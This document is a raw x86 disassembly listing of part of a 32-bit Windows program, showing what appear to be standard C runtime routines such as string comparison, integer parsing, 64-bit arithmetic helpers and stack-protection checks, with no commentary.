  426c0b:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c0f:	mov    esi,DWORD PTR [ebp-0x44]
  426c12:	cmp    ebx,edi
  426c14:	jne    0x426c34
  426c16:	push   esi
  426c17:	push   0x2
  426c19:	call   0x424978
  426c1e:	pop    ecx
  426c1f:	pop    ecx
  426c20:	mov    ebx,eax
  426c22:	cmp    ebx,edi
  426c24:	jne    0x426c2d
  426c26:	xor    eax,eax
  426c28:	jmp    0x426ce1
  426c2d:	mov    DWORD PTR [ebp-0x24],0x1
  426c34:	push   esi
  426c35:	push   ebx
  426c36:	push   DWORD PTR [ebp-0x28]
  426c39:	push   DWORD PTR [ebp+0x10]
  426c3c:	push   0x1
  426c3e:	push   DWORD PTR [ebp+0x8]
  426c41:	call   DWORD PTR ds:0x4280cc
  426c47:	test   eax,eax
  426c49:	je     0x426cd2
  426c4f:	cmp    DWORD PTR [ebp+0x18],edi
  426c52:	je     0x426c74
  426c54:	push   edi
  426c55:	push   edi
  426c56:	push   DWORD PTR [ebp+0x1c]
  426c59:	push   DWORD PTR [ebp+0x18]
  426c5c:	push   esi
  426c5d:	push   ebx
  426c5e:	push   edi
  426c5f:	push   DWORD PTR [ebp+0xc]
  426c62:	call   DWORD PTR ds:0x428050
  426c68:	test   eax,eax
  426c6a:	je     0x426cd2
  426c6c:	mov    eax,DWORD PTR [ebp+0x18]
  426c6f:	mov    DWORD PTR [ebp-0x20],eax
  426c72:	jmp    0x426cd2
  426c74:	cmp    DWORD PTR [ebp-0x2c],edi
  426c77:	jne    0x426c8f
  426c79:	push   edi
  426c7a:	push   edi
  426c7b:	push   edi
  426c7c:	push   edi
  426c7d:	push   esi
  426c7e:	push   ebx
  426c7f:	push   edi
  426c80:	push   DWORD PTR [ebp+0xc]
  426c83:	call   DWORD PTR ds:0x428050
  426c89:	mov    esi,eax
  426c8b:	cmp    esi,edi
  426c8d:	je     0x426cd2
  426c8f:	push   esi
  426c90:	push   0x1
  426c92:	call   0x424978
  426c97:	pop    ecx
  426c98:	pop    ecx
  426c99:	mov    DWORD PTR [ebp-0x20],eax
  426c9c:	cmp    eax,edi
  426c9e:	je     0x426cd2
  426ca0:	push   edi
  426ca1:	push   edi
  426ca2:	push   esi
  426ca3:	push   eax
  426ca4:	push   esi
  426ca5:	push   ebx
  426ca6:	push   edi
  426ca7:	push   DWORD PTR [ebp+0xc]
  426caa:	call   DWORD PTR ds:0x428050
  426cb0:	cmp    eax,edi
  426cb2:	jne    0x426cc2
  426cb4:	push   DWORD PTR [ebp-0x20]
  426cb7:	call   0x42446a
  426cbc:	pop    ecx
  426cbd:	mov    DWORD PTR [ebp-0x20],edi
  426cc0:	jmp    0x426cd2
  426cc2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426cc6:	je     0x426cd2
  426cc8:	mov    ecx,DWORD PTR [ebp+0x14]
  426ccb:	mov    DWORD PTR [ecx],eax
  426ccd:	jmp    0x426cd2
  426ccf:	mov    ebx,DWORD PTR [ebp-0x48]
  426cd2:	cmp    DWORD PTR [ebp-0x24],edi
  426cd5:	je     0x426cde
  426cd7:	push   ebx
  426cd8:	call   0x42446a
  426cdd:	pop    ecx
  426cde:	mov    eax,DWORD PTR [ebp-0x20]
  426ce1:	lea    esp,[ebp-0x54]
  426ce4:	mov    ecx,DWORD PTR [ebp-0x1c]
  426ce7:	xor    ecx,DWORD PTR [ebp+0x4]
  426cea:	call   0x423f2c
  426cef:	call   0x423893
  426cf4:	ret    
  426cf5:	push   ebp
  426cf6:	mov    ebp,esp
  426cf8:	sub    esp,0x48
  426cfb:	push   ebx
  426cfc:	push   esi
  426cfd:	push   edi
  426cfe:	push   0x4
  426d00:	pop    eax
  426d01:	call   0x4238b0
  426d06:	mov    ebx,esp
  426d08:	push   0x1c
  426d0a:	lea    eax,[ebp-0x24]
  426d0d:	push   eax
  426d0e:	push   ebx
  426d0f:	call   DWORD PTR ds:0x4280e8
  426d15:	test   eax,eax
  426d17:	je     0x426d8a
  426d19:	mov    edi,DWORD PTR [ebp-0x20]
  426d1c:	lea    eax,[ebp-0x48]
  426d1f:	push   eax
  426d20:	call   DWORD PTR ds:0x4280e4
  426d26:	mov    eax,DWORD PTR [ebp-0x44]
  426d29:	lea    esi,[eax-0x1]
  426d2c:	not    esi
  426d2e:	and    esi,ebx
  426d30:	sub    esi,eax
  426d32:	mov    DWORD PTR [ebp-0x4],eax
  426d35:	mov    eax,ds:0x45cac4
  426d3a:	mov    ecx,eax
  426d3c:	dec    ecx
  426d3d:	neg    ecx
  426d3f:	sbb    ecx,ecx
  426d41:	and    ecx,0xffff1000
  426d47:	add    ecx,0x11000
  426d4d:	add    ecx,edi
  426d4f:	cmp    esi,ecx
  426d51:	jb     0x426d8a
  426d53:	cmp    eax,0x1
  426d56:	je     0x426da2
  426d58:	mov    ebx,edi
  426d5a:	mov    edi,0x1000
  426d5f:	push   0x1c
  426d61:	lea    eax,[ebp-0x24]
  426d64:	push   eax
  426d65:	push   ebx
  426d66:	call   DWORD PTR ds:0x4280e8
  426d6c:	test   eax,eax
  426d6e:	je     0x426d8a
  426d70:	add    ebx,DWORD PTR [ebp-0x18]
  426d73:	test   DWORD PTR [ebp-0x14],edi
  426d76:	je     0x426d5f
  426d78:	test   BYTE PTR [ebp-0xf],0x1
  426d7c:	mov    ebx,DWORD PTR [ebp-0x24]
  426d7f:	je     0x426d86
  426d81:	xor    eax,eax
  426d83:	inc    eax
  426d84:	jmp    0x426dbe
  426d86:	cmp    esi,ebx
  426d88:	jae    0x426d8e
  426d8a:	xor    eax,eax
  426d8c:	jmp    0x426dbe
  426d8e:	push   0x4
  426d90:	push   edi
  426d91:	push   DWORD PTR [ebp-0x4]
  426d94:	push   ebx
  426d95:	call   DWORD PTR ds:0x4280ac
  426d9b:	mov    eax,ds:0x45cac4
  426da0:	jmp    0x426da4
  426da2:	mov    ebx,esi
  426da4:	dec    eax
  426da5:	neg    eax
  426da7:	sbb    eax,eax
  426da9:	and    eax,0x103
  426dae:	lea    ecx,[ebp-0x8]
  426db1:	push   ecx
  426db2:	inc    eax
  426db3:	push   eax
  426db4:	push   DWORD PTR [ebp-0x4]
  426db7:	push   ebx
  426db8:	call   DWORD PTR ds:0x428008
  426dbe:	lea    esp,[ebp-0x54]
  426dc1:	pop    edi
  426dc2:	pop    esi
  426dc3:	pop    ebx
  426dc4:	leave  
  426dc5:	ret    
  426dc6:	int3   
  426dc7:	int3   
  426dc8:	int3   
  426dc9:	int3   
  426dca:	int3   
  426dcb:	int3   
  426dcc:	int3   
  426dcd:	int3   
  426dce:	int3   
  426dcf:	int3   
  426dd0:	push   ebp
  426dd1:	mov    ebp,esp
  426dd3:	push   edi
  426dd4:	push   esi
  426dd5:	push   ebx
  426dd6:	mov    esi,DWORD PTR [ebp+0xc]
  426dd9:	mov    edi,DWORD PTR [ebp+0x8]
  426ddc:	mov    al,0xff
  426dde:	mov    edi,edi
  426de0:	or     al,al
  426de2:	je     0x426e16
  426de4:	mov    al,BYTE PTR [esi]
  426de6:	add    esi,0x1
  426de9:	mov    ah,BYTE PTR [edi]
  426deb:	add    edi,0x1
  426dee:	cmp    ah,al
  426df0:	je     0x426de0
  426df2:	sub    al,0x41
  426df4:	cmp    al,0x1a
  426df6:	sbb    cl,cl
  426df8:	and    cl,0x20
  426dfb:	add    al,cl
  426dfd:	add    al,0x41
  426dff:	xchg   al,ah
  426e01:	sub    al,0x41
  426e03:	cmp    al,0x1a
  426e05:	sbb    cl,cl
  426e07:	and    cl,0x20
  426e0a:	add    al,cl
  426e0c:	add    al,0x41
  426e0e:	cmp    al,ah
  426e10:	je     0x426de0
  426e12:	sbb    al,al
  426e14:	sbb    al,0xff
  426e16:	movsx  eax,al
  426e19:	pop    ebx
  426e1a:	pop    esi
  426e1b:	pop    edi
  426e1c:	leave  
  426e1d:	ret    
  426e1e:	push   esi
  426e1f:	push   edi
  426e20:	call   0x42370d
  426e25:	mov    edi,DWORD PTR [eax+0x64]
  426e28:	cmp    edi,DWORD PTR ds:0x45c58c
  426e2e:	je     0x426e37
  426e30:	call   0x424bbf
  426e35:	mov    edi,eax
  426e37:	mov    esi,DWORD PTR [esp+0xc]
  426e3b:	cmp    DWORD PTR [edi+0x28],0x1
  426e3f:	movzx  eax,BYTE PTR [esi]
  426e42:	jle    0x426e52
  426e44:	push   0x8
  426e46:	push   eax
  426e47:	push   edi
  426e48:	call   0x426ea6
  426e4d:	add    esp,0xc
  426e50:	jmp    0x426e5c
  426e52:	mov    ecx,DWORD PTR [edi+0x48]
  426e55:	movzx  eax,BYTE PTR [ecx+eax*2]
  426e59:	and    eax,0x8
  426e5c:	test   eax,eax
  426e5e:	je     0x426e63
  426e60:	inc    esi
  426e61:	jmp    0x426e3b
  426e63:	movzx  ecx,BYTE PTR [esi]
  426e66:	inc    esi
  426e67:	cmp    ecx,0x2d
  426e6a:	mov    edx,ecx
  426e6c:	je     0x426e73
  426e6e:	cmp    ecx,0x2b
  426e71:	jne    0x426e77
  426e73:	movzx  ecx,BYTE PTR [esi]
  426e76:	inc    esi
  426e77:	xor    eax,eax
  426e79:	cmp    ecx,0x30
  426e7c:	jl     0x426e88
  426e7e:	cmp    ecx,0x39
  426e81:	jg     0x426e88
  426e83:	sub    ecx,0x30
  426e86:	jmp    0x426e8b
  426e88:	or     ecx,0xffffffff
  426e8b:	cmp    ecx,0xffffffff
  426e8e:	je     0x426e9c
  426e90:	lea    eax,[eax+eax*4]
  426e93:	lea    eax,[ecx+eax*2]
  426e96:	movzx  ecx,BYTE PTR [esi]
  426e99:	inc    esi
  426e9a:	jmp    0x426e79
  426e9c:	cmp    edx,0x2d
  426e9f:	pop    edi
  426ea0:	pop    esi
  426ea1:	jne    0x426ea5
  426ea3:	neg    eax
  426ea5:	ret    
  426ea6:	push   ebp
  426ea7:	mov    ebp,esp
  426ea9:	push   ecx
  426eaa:	mov    eax,DWORD PTR [ebp+0xc]
  426ead:	lea    ecx,[eax+0x1]
  426eb0:	cmp    ecx,0x100
  426eb6:	mov    ecx,DWORD PTR [ebp+0x8]
  426eb9:	ja     0x426ec4
  426ebb:	mov    ecx,DWORD PTR [ecx+0x48]
  426ebe:	movzx  eax,WORD PTR [ecx+eax*2]
  426ec2:	jmp    0x426f18
  426ec4:	push   esi
  426ec5:	mov    edx,eax
  426ec7:	sar    edx,0x8
  426eca:	push   edi
  426ecb:	mov    edi,DWORD PTR [ecx+0x48]
  426ece:	movzx  esi,dl
  426ed1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426ed6:	pop    edi
  426ed7:	pop    esi
  426ed8:	je     0x426ee9
  426eda:	and    BYTE PTR [ebp-0x2],0x0
  426ede:	push   0x2
  426ee0:	mov    BYTE PTR [ebp-0x3],al
  426ee3:	mov    BYTE PTR [ebp-0x4],dl
  426ee6:	pop    eax
  426ee7:	jmp    0x426ef3
  426ee9:	and    BYTE PTR [ebp-0x3],0x0
  426eed:	mov    BYTE PTR [ebp-0x4],al
  426ef0:	xor    eax,eax
  426ef2:	inc    eax
  426ef3:	push   0x1
  426ef5:	push   DWORD PTR [ecx+0x14]
  426ef8:	push   DWORD PTR [ecx+0x4]
  426efb:	lea    ecx,[ebp+0xe]
  426efe:	push   ecx
  426eff:	push   eax
  426f00:	lea    eax,[ebp-0x4]
  426f03:	push   eax
  426f04:	push   0x1
  426f06:	call   0x425f88
  426f0b:	add    esp,0x1c
  426f0e:	test   eax,eax
  426f10:	jne    0x426f14
  426f12:	leave  
  426f13:	ret    
  426f14:	movzx  eax,WORD PTR [ebp+0xe]
  426f18:	and    eax,DWORD PTR [ebp+0x10]
  426f1b:	leave  
  426f1c:	ret    
  426f1d:	int3   
  426f1e:	int3   
  426f1f:	int3   
  426f20:	mov    eax,DWORD PTR [esp+0x8]
  426f24:	mov    ecx,DWORD PTR [esp+0x10]
  426f28:	or     ecx,eax
  426f2a:	mov    ecx,DWORD PTR [esp+0xc]
  426f2e:	jne    0x426f39
  426f30:	mov    eax,DWORD PTR [esp+0x4]
  426f34:	mul    ecx
  426f36:	ret    0x10
  426f39:	push   ebx
  426f3a:	mul    ecx
  426f3c:	mov    ebx,eax
  426f3e:	mov    eax,DWORD PTR [esp+0x8]
  426f42:	mul    DWORD PTR [esp+0x14]
  426f46:	add    ebx,eax
  426f48:	mov    eax,DWORD PTR [esp+0x8]
  426f4c:	mul    ecx
  426f4e:	add    edx,ebx
  426f50:	pop    ebx
  426f51:	ret    0x10
  426f54:	int3   
  426f55:	int3   
  426f56:	int3   
  426f57:	int3   
  426f58:	int3   
  426f59:	int3   
  426f5a:	int3   
  426f5b:	int3   
  426f5c:	int3   
  426f5d:	int3   
  426f5e:	int3   
  426f5f:	int3   
  426f60:	push   ebp
  426f61:	mov    ebp,esp
  426f63:	push   edi
  426f64:	push   esi
  426f65:	push   ebx
  426f66:	mov    ecx,DWORD PTR [ebp+0x10]
  426f69:	or     ecx,ecx
  426f6b:	je     0x426fba
  426f6d:	mov    esi,DWORD PTR [ebp+0x8]
  426f70:	mov    edi,DWORD PTR [ebp+0xc]
  426f73:	mov    bh,0x41
  426f75:	mov    bl,0x5a
  426f77:	mov    dh,0x20
  426f79:	lea    ecx,[ecx+0x0]
  426f7c:	mov    ah,BYTE PTR [esi]
  426f7e:	or     ah,ah
  426f80:	mov    al,BYTE PTR [edi]
  426f82:	je     0x426fab
  426f84:	or     al,al
  426f86:	je     0x426fab
  426f88:	add    esi,0x1
  426f8b:	add    edi,0x1
  426f8e:	cmp    ah,bh
  426f90:	jb     0x426f98
  426f92:	cmp    ah,bl
  426f94:	ja     0x426f98
  426f96:	add    ah,dh
  426f98:	cmp    al,bh
  426f9a:	jb     0x426fa2
  426f9c:	cmp    al,bl
  426f9e:	ja     0x426fa2
  426fa0:	add    al,dh
  426fa2:	cmp    ah,al
  426fa4:	jne    0x426fb1
  426fa6:	sub    ecx,0x1
  426fa9:	jne    0x426f7c
  426fab:	xor    ecx,ecx
  426fad:	cmp    ah,al
  426faf:	je     0x426fba
  426fb1:	mov    ecx,0xffffffff
  426fb6:	jb     0x426fba
  426fb8:	neg    ecx
  426fba:	mov    eax,ecx
  426fbc:	pop    ebx
  426fbd:	pop    esi
  426fbe:	pop    edi
  426fbf:	leave  
  426fc0:	ret    
  426fc1:	int3   
  426fc2:	int3   
  426fc3:	int3   
  426fc4:	int3   
  426fc5:	int3   
  426fc6:	int3   
  426fc7:	int3   
  426fc8:	int3   
  426fc9:	int3   
  426fca:	int3   
  426fcb:	int3   
  426fcc:	int3   
  426fcd:	int3   
  426fce:	int3   
  426fcf:	int3   
  426fd0:	push   esi
  426fd1:	mov    eax,DWORD PTR [esp+0x14]
  426fd5:	or     eax,eax
  426fd7:	jne    0x427001
  426fd9:	mov    ecx,DWORD PTR [esp+0x10]
  426fdd:	mov    eax,DWORD PTR [esp+0xc]
  426fe1:	xor    edx,edx
  426fe3:	div    ecx
  426fe5:	mov    ebx,eax
  426fe7:	mov    eax,DWORD PTR [esp+0x8]
  426feb:	div    ecx
  426fed:	mov    esi,eax
  426fef:	mov    eax,ebx
  426ff1:	mul    DWORD PTR [esp+0x10]
  426ff5:	mov    ecx,eax
  426ff7:	mov    eax,esi
  426ff9:	mul    DWORD PTR [esp+0x10]
  426ffd:	add    edx,ecx
  426fff:	jmp    0x427048
  427001:	mov    ecx,eax
  427003:	mov    ebx,DWORD PTR [esp+0x10]
  427007:	mov    edx,DWORD PTR [esp+0xc]
  42700b:	mov    eax,DWORD PTR [esp+0x8]
  42700f:	shr    ecx,1
  427011:	rcr    ebx,1
  427013:	shr    edx,1
  427015:	rcr    eax,1
  427017:	or     ecx,ecx
  427019:	jne    0x42700f
  42701b:	div    ebx
  42701d:	mov    esi,eax
  42701f:	mul    DWORD PTR [esp+0x14]
  427023:	mov    ecx,eax
  427025:	mov    eax,DWORD PTR [esp+0x10]
  427029:	mul    esi
  42702b:	add    edx,ecx
  42702d:	jb     0x42703d
  42702f:	cmp    edx,DWORD PTR [esp+0xc]
  427033:	ja     0x42703d
  427035:	jb     0x427046
  427037:	cmp    eax,DWORD PTR [esp+0x8]
  42703b:	jbe    0x427046
  42703d:	dec    esi
  42703e:	sub    eax,DWORD PTR [esp+0x10]
  427042:	sbb    edx,DWORD PTR [esp+0x14]
  427046:	xor    ebx,ebx
  427048:	sub    eax,DWORD PTR [esp+0x8]
  42704c:	sbb    edx,DWORD PTR [esp+0xc]
  427050:	neg    edx
  427052:	neg    eax
  427054:	sbb    edx,0x0
  427057:	mov    ecx,edx
  427059:	mov    edx,ebx
  42705b:	mov    ebx,ecx
  42705d:	mov    ecx,eax
  42705f:	mov    eax,esi
  427061:	pop    esi
  427062:	ret    0x10
  427065:	int3   
  427066:	int3   
  427067:	int3   
  427068:	int3   
  427069:	int3   
  42706a:	int3   
  42706b:	int3   
  42706c:	int3   
  42706d:	int3   
  42706e:	int3   
  42706f:	int3   
  427070:	lea    eax,[edx-0x1]
  427073:	pop    ebx
  427074:	ret    
  427075:	lea    esp,[esp+0x0]
  42707c:	lea    esp,[esp+0x0]
  427080:	xor    eax,eax
  427082:	mov    al,BYTE PTR [esp+0x8]
  427086:	push   ebx
  427087:	mov    ebx,eax
  427089:	shl    eax,0x8
  42708c:	mov    edx,DWORD PTR [esp+0x8]
  427090:	test   edx,0x3
  427096:	je     0x4270ad
  427098:	mov    cl,BYTE PTR [edx]
  42709a:	add    edx,0x1
  42709d:	cmp    cl,bl
  42709f:	je     0x427070
  4270a1:	test   cl,cl
  4270a3:	je     0x4270f6
  4270a5:	test   edx,0x3
  4270ab:	jne    0x427098
  4270ad:	or     ebx,eax
  4270af:	push   edi
  4270b0:	mov    eax,ebx
  4270b2:	shl    ebx,0x10
  4270b5:	push   esi
  4270b6:	or     ebx,eax
  4270b8:	mov    ecx,DWORD PTR [edx]
  4270ba:	mov    edi,0x7efefeff
  4270bf:	mov    eax,ecx
  4270c1:	mov    esi,edi
  4270c3:	xor    ecx,ebx
  4270c5:	add    esi,eax
  4270c7:	add    edi,ecx
  4270c9:	xor    ecx,0xffffffff
  4270cc:	xor    eax,0xffffffff
  4270cf:	xor    ecx,edi
  4270d1:	xor    eax,esi
  4270d3:	add    edx,0x4
  4270d6:	and    ecx,0x81010100
  4270dc:	jne    0x4270fa
  4270de:	and    eax,0x81010100
  4270e3:	je     0x4270b8
  4270e5:	and    eax,0x1010100
  4270ea:	jne    0x4270f4
  4270ec:	and    esi,0x80000000
  4270f2:	jne    0x4270b8
  4270f4:	pop    esi
  4270f5:	pop    edi
  4270f6:	pop    ebx
  4270f7:	xor    eax,eax
  4270f9:	ret    
  4270fa:	mov    eax,DWORD PTR [edx-0x4]
  4270fd:	cmp    al,bl
  4270ff:	je     0x427137
  427101:	test   al,al
  427103:	je     0x4270f4
  427105:	cmp    ah,bl
  427107:	je     0x427130
  427109:	test   ah,ah
  42710b:	je     0x4270f4
  42710d:	shr    eax,0x10
  427110:	cmp    al,bl
  427112:	je     0x427129
  427114:	test   al,al
  427116:	je     0x4270f4
  427118:	cmp    ah,bl
  42711a:	je     0x427122
  42711c:	test   ah,ah
  42711e:	je     0x4270f4
  427120:	jmp    0x4270b8
  427122:	pop    esi
  427123:	pop    edi
  427124:	lea    eax,[edx-0x1]
  427127:	pop    ebx
  427128:	ret    
  427129:	lea    eax,[edx-0x2]
  42712c:	pop    esi
  42712d:	pop    edi
  42712e:	pop    ebx
  42712f:	ret    
  427130:	lea    eax,[edx-0x3]
  427133:	pop    esi
  427134:	pop    edi
  427135:	pop    ebx
  427136:	ret    
  427137:	lea    eax,[edx-0x4]
  42713a:	pop    esi
  42713b:	pop    edi
  42713c:	pop    ebx
  42713d:	ret    
  42713e:	jmp    DWORD PTR ds:0x4280e0
